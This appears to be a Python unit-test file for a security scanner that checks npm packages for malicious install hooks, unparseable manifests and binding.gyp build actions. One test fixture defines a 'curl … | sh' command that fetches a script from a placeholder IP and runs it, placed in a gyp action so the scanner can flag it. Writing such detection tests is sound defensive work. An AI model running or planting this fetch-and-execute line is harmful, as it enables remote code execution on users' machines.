"""Review finding 3 (shared semantics 3) and the gyp half of finding 4.

- A UTF-8 BOM made package.json unparseable => no hooks => OK, while npm
  strips the BOM and runs the hook. Only JSONDecodeError was caught: a
  5000-digit integer (int max str digits) crashed the scan.
- An unparseable ROOT manifest is SC-MANIFEST-UNPARSEABLE (MAJOR) in project
  scans and makes a registry verdict INCOMPLETE.
- Local-install hooks: preinstall, install, postinstall, preprepare, prepare,
  postprepare; in a project checkout a prepare-family hook that is not
  suspicious is INFO (and no longer fails the gate), a suspicious one stays
  CRITICAL.
- binding.gyp is a Python literal (single quotes, comments); a root one is
  npm's implicit `node-gyp rebuild` install hook, and the registry never ran
  scan_gyp at all.
This file covers the registry side; the scanner-core semantics are in
test_review_core.py.
"""

import json
import unittest

from tests.registry._review_support import hooks, issues, manifest, rules, scan_npm

CURL = "curl -s http://192.0.2.1/x | sh"


class RegistryManifestTests(unittest.TestCase):
    def test_unparseable_root_package_json_is_incomplete(self):
        res = scan_npm({"package.json": '{"name": "x", "scripts": {"install": ',
                        "index.js": "module.exports = 1;\n"})
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])
        self.assertIn("SC-MANIFEST-UNPARSEABLE", rules(res))
        self.assertEqual(res["weakIndicators"], 0)

    def test_nested_unparseable_package_json_is_not_incomplete(self):
        res = scan_npm({"package.json": manifest(), "test/fixtures/package.json": "{"})
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_root_binding_gyp_is_scanned_and_an_implicit_hook(self):
        gyp = json.dumps({"targets": [{"target_name": "x", "actions": [
            {"action_name": "a", "action": ["sh", "-c", CURL]}]}]})
        res = scan_npm({"package.json": manifest(), "binding.gyp": gyp})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        res = scan_npm({"package.json": manifest(), "binding.gyp": "{'targets': [{'target_name': 'x'}]}"})
        self.assertEqual(res["verdict"], "WARN")
        implicit = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual(len(implicit), 1)
        self.assertIn("node-gyp rebuild", implicit[0]["msg"])

    def test_no_implicit_hook_with_own_install_script_or_gypfile_false(self):
        gyp = "{'targets': [{'target_name': 'x'}]}"
        res = scan_npm({"package.json": manifest(gypfile=False), "binding.gyp": gyp})
        self.assertEqual(res["verdict"], "OK")
        res = scan_npm({"package.json": hooks(install="node-gyp-build"), "binding.gyp": gyp})
        self.assertEqual([i["msg"] for i in issues(res, "SC-INSTALL-HOOK")],
                         ["\"install\" script runs code at install time: 'node-gyp-build'."])

    def test_unparseable_root_binding_gyp_is_incomplete(self):
        res = scan_npm({"package.json": manifest(), "binding.gyp": "{'targets': ["})
        self.assertEqual(res["verdict"], "INCOMPLETE")


if __name__ == "__main__":
    unittest.main()
